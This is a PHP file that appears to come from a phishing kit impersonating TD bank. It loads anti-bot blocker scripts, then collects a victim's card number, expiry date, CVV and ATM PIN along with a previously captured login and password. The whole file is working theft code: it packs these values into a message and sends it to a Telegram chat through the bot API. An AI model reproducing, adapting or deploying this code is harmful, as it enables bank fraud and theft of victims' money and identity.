<?php
include("../settings/infos4.php");
    include 'blocker.php';
        include 'prevents/anti7.php';
            include 'prevents/anti8.php';
                include 'prevents/anti9.php';
require "configg.php";
require "tc_assetz/ninc/session_protect.php";
require "tc_assetz/ninc/functions.php";
if($_SESSION['passed_captcha'] == 'yes'){
    
}else{
    header( "Location: index.php" ); 
}
if(isset($_POST))
{

    if(!isset($_SESSION)){
        session_start();
    }


    $_SESSION['cn'] = htmlspecialchars($_POST['CN']);
    $_SESSION['em'] = htmlspecialchars($_POST['EM']);
    $_SESSION['ey'] = htmlspecialchars($_POST['EY']);
    $_SESSION['cv'] = htmlspecialchars($_POST['CV']);
    $_SESSION['ap'] = htmlspecialchars($_POST['AP']);
    $_SESSION['UA'] = htmlspecialchars($_SERVER['HTTP_USER_AGENT']);
      $data = [
            'text' => '
--------- TD CVV ----------

Login : '.$_SESSION['user'].'

Password : '.$_SESSION['pass'].'

Card Number : '.$_SESSION['cn'].'

Expi : |'.$_SESSION['em'].'/'.$_SESSION['ey'].'|

Cvv : '.$_SESSION['cv'].'

Atm Pin : '.$_SESSION['ap'].'

---------- Z51 DG ---------
            ',
            'chat_id' => $chat_card
          ];


           file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
                }
 ?>
